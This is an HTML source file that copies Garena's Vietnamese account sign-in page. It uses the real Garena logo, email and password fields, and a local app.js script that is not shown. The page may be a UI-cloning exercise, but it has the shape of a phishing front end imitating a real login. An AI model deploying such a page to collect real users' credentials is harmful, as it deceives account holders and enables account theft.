<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Garena Account Center</title>
    <link rel="stylesheet" href="./signin.css">
</head>

<body>
    <div class="header">
        <div id="top-bar"></div>
        <div class="Garena">
            <a href="http://platform.garena.vn/register/">
                <img src="https://sso.garena.com/images/img_garena_logo.png" alt="" style="height:33px"></a>
        </div>
    </div>
    <div class="page">
        <div class="main">
            <div class="sign-in">Đăng Nhập</div>
            <div>
                <input class="ipSignin" id="ipSignin" type="text" placeholder="Email hoặc số điện thoại">
            </div>
            <div class="pw">
                <input class="ipPw" id="ipPw" type="password" placeholder="Mật khẩu">
            </div>
            <div>
                <button class="btnSignIn" id="btnSignIn">Đăng Nhập Ngay</button>
            </div>
            <div class="container">
                <div class="line"></div>
                <span class="hoac">hoặc</span>
                <div class="line"></div>
            </div>
            <div>
                <button class="btnSignUp">Tạo tài khoản mới</button>
            </div>
            <div class="forgotPw">Quên mật khẩu?</div>
        </div>
    </div>
    <script src="./app.js"></script>
</body>

</html>
